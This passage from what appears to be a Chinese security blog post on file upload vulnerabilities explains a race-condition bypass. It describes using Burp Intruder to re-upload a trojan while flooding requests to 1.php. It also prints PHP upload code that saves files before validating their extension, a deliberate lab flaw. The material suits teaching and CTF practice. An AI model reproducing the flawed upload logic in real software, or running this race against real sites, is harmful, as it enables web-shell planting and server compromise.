+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="原理" class="heading-element"><span>原理</span>
+  <a href="#%e5%8e%9f%e7%90%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p>
+<h4 id="基本思路" class="heading-element"><span>基本思路</span>
+  <a href="#%e5%9f%ba%e6%9c%ac%e6%80%9d%e8%b7%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>上传文件源代码里没有校验上传的文件，文件直接上传</p>
+<p><strong>上传成功后才进行判断</strong>：如果文件格式符合要求，则重命名，如果文件格式不符合要求，将文件删除。</p>
+<p>由于服务器并发处理(同时)多个请求，假如<code>a用户</code>上传了木马文件，由于代码执行需要时间，在此过程中<code>b用户</code>访问了<code>a用户</code>上传的文件，会有以下三种情况：</p>
+<p>  1. 访问时间点在上传成功之前，没有此文件。</p>
+<p>  2. <strong>访问时间点在刚上传成功但还没有进行判断，该文件存在。</strong></p>
+<p>  3. 访问时间点在判断之后，文件被删除，没有此文件。</p>
+<p>我们需要达到 2 条件</p>
+<h4 id="利用" class="heading-element"><span>利用</span>
+  <a href="#%e5%88%a9%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>使用bp的Intruder工具，拦截代理流量用这个一直发包上传的文件</p>
+<p>同时抓包访问1.php，营造<code>10000人</code>访问<code>1.php</code>的场景</p>
+<p>找200的访问成功的结果，成果执行</p>
+<h4 id="一个源码例子" class="heading-element"><span>一个源码例子</span>
+  <a href="#%e4%b8%80%e4%b8%aa%e6%ba%90%e7%a0%81%e4%be%8b%e5%ad%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>   <span class="c1">//判断文件上传操作
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])){</span>  <span class="c1">//判断是否接收到这个文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$ext_arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;jpg&#39;</span><span class="p">,</span><span class="s1">&#39;png&#39;</span><span class="p">,</span><span class="s1">&#39;gif&#39;</span><span class="p">);</span>  <span class="c1">//声明一个数组，数组里面有3条数据，为：&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$file_name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>  <span class="c1">//获取图片的名字
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span> <span class="c1">//获取图片的临时存储路径
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span><span class="s2">&#34;.&#34;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//通过文件名截取图片后缀
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$upload_file</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$file_name</span><span class="p">;</span> <span class="c1">//构造图片的上传路径，这里暂时重构图片后缀名。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span> <span class="nv">$upload_file</span><span class="p">)){</span> <span class="c1">//这里对文件进行了转存
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span><span class="nv">$ext_arr</span><span class="p">)){</span> <span class="c1">//这里使用截取到的后缀名和数组里面的后缀名进行对比
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>             <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="o">.</span> <span class="nx">rand</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">99</span><span class="p">)</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;YmdHis&#34;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;.&#34;</span><span class="o">.</span><span class="nv">$file_ext</span><span class="p">;</span>  <span class="c1">//如果存在，就对文件名进行重构
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>             <span class="nx">rename</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">,</span> <span class="nv">$img_path</span><span class="p">);</span>  <span class="c1">//把上面的文件名进行重命名
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>             <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;只允许上传.jpg|.png|.gif类型文件！&#34;</span><span class="p">;</span> <span class="c1">//否则返回&#34;只允许上传.jpg|.png|.gif类型文件！&#34;数据。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">unlink</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span><span class="c1">// 并删除这个文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;上传出错！&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>关键函数：<code>move_uploaded_file</code></p>
+<h2 id="做题的一些思路" class="heading-element"><span>做题的一些思路</span>
+  <a href="#%e5%81%9a%e9%a2%98%e7%9a%84%e4%b8%80%e4%ba%9b%e6%80%9d%e8%b7%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-10-30 11:25:40">Updated on 2024-10-30&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/posts/2024web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="http://localhost:1313/posts/2024web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-title="文件上传漏洞" data-hashtags="Web,文件上传"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/2024web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-hashtag="Web"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/2024web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-title="文件上传漏洞"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/web/" class="post-tag" title="Tags - Web">Web</a><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-tag" title="Tags - 文件上传">文件上传</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/2024%E5%81%9A%E9%A2%98-gkctf-2020checkin/" class="post-nav-item" rel="prev" title="【GKCTF 2020】CheckIN"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>【GKCTF 2020】CheckIN</a><a href="/posts/2024web-ssti%E6%A8%A1%E6%9D%BF%E5%88%A4%E6%96%AD/" class="post-nav-item" rel="next" title="SSTI模版判断">SSTI模版判断<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.136.5">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.13">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="Tin10g.github.io">Ting</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":1000},"comment":{"enable":false},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.13"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
